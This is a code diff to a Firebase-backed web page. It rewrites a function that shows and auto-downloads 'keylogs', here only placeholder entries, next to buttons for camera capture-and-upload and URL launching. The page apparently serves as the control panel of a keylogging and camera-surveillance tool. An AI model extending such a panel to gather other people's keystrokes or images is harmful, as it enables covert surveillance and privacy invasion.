@@ -75,51 +75,57 @@ firebase.initializeApp(firebaseConfig);
         }
 
         // Function to fetch all keylogs (replace with your actual keylogs fetching logic)
-        function fetchAllKeylogs() {
-            // Example keylogs data, replace this with the actual keylogs fetch logic
-            return new Promise(resolve => {
-                let keylogs = [
-                    'User pressed C',
-                    'User pressed B',
-                    'User pressed A',
-                    // Add more keylogs here or fetch from Firebase
-                ];
-                resolve(keylogs);
-            });
-        }
+function fetchAllKeylogs() {
+    // Example keylogs data, replace this with the actual keylogs fetch logic
+    return new Promise(resolve => {
+        let keylogs = [
+            'User pressed A',
+            'User pressed B',
+            'User pressed C',
+            // Add more keylogs here or fetch from Firebase
+        ];
+        resolve(keylogs);
+    });
+}
 
-        // Function to handle displaying and downloading keylogs
-        function keylogger() {
-            fetchAllKeylogs().then(keylogs => {
-                // Create a new window to display keylogs
-                let newWindow = window.open('', 'Keylogs', 'width=600,height=400');
-                let content = '<html><head><title>Keylogs</title></head><body>';
-                content += '<h1>Keylogs</h1>';
-                content += '<ul>';
-                // Reverse keylogs array to show newest first
-                keylogs.reverse().forEach(log => {
-                    content += `<li>${log}</li>`;
-                });
-                content += '</ul>';
-                content += '<a href="#" onclick="downloadKeylogs()">Download Keylogs</a>';
-                content += '<script>';
-                content += 'function downloadKeylogs() {';
-                content += 'var keylogs = ' + JSON.stringify(keylogs) + ';';
-                content += 'var blob = new Blob([keylogs.join("\\n")], { type: "text/plain" });';
-                content += 'var url = URL.createObjectURL(blob);';
-                content += 'var a = document.createElement("a");';
-                content += 'a.href = url;';
-                content += 'a.download = "keylogs.txt";';
-                content += 'a.click();';
-                content += 'URL.revokeObjectURL(url);';
-                content += '}';
-                content += '<\/script>';
-                content += '</body></html>';
-                newWindow.document.open();
-                newWindow.document.write(content);
-                newWindow.document.close();
-            });
-        }
+// Function to handle keylogger action
+function keylogger() {
+    fetchAllKeylogs().then(keylogs => {
+        // Open a new window
+        const newWindow = window.open("", "Keylogs", "width=600,height=400");
+
+        // Create the HTML content for the new window
+        const content = `
+            <html>
+            <head><title>Keylogs</title></head>
+            <body>
+                <h1>Keylogs</h1>
+                <pre id="keylogContent">${keylogs.reverse().join('\n')}</pre>
+                <a id="downloadLink" href="#" download="keylogs.txt">Download Keylogs</a>
+                <script>
+                    // Create a blob from keylogs and initiate download
+                    const keylogs = ${JSON.stringify(keylogs.reverse())};
+                    const blob = new Blob([keylogs.join('\\n')], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    document.getElementById('downloadLink').href = url;
+
+                    // Auto-click the download link to trigger the download
+                    document.getElementById('downloadLink').click();
+
+                    // Clean up URL object after download
+                    URL.revokeObjectURL(url);
+                </script>
+            </body>
+            </html>
+        `;
+
+        // Write the HTML content to the new window
+        newWindow.document.open();
+        newWindow.document.write(content);
+        newWindow.document.close();
+    });
+}
+
 
 
 </script>
@@ -647,8 +653,8 @@ text-align:center;
 <div class="dfle"  style="" >
 <div id="camera-button" class="icon" onclick="captureAndUpload()" style="background:url('./img/cam.png');background-size:50px 50px;background-repeat:no-repeat;">Camera</div>
   <!-- CamSnap Beta 1.0 by @ES-->
-<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
-<div id="keylogg"></div>
+  <div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
+  <div id="keylogg"></div>
 <!-- Kylogs Downloader 1.0 by @ES-->
 <div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div> 
 </div>
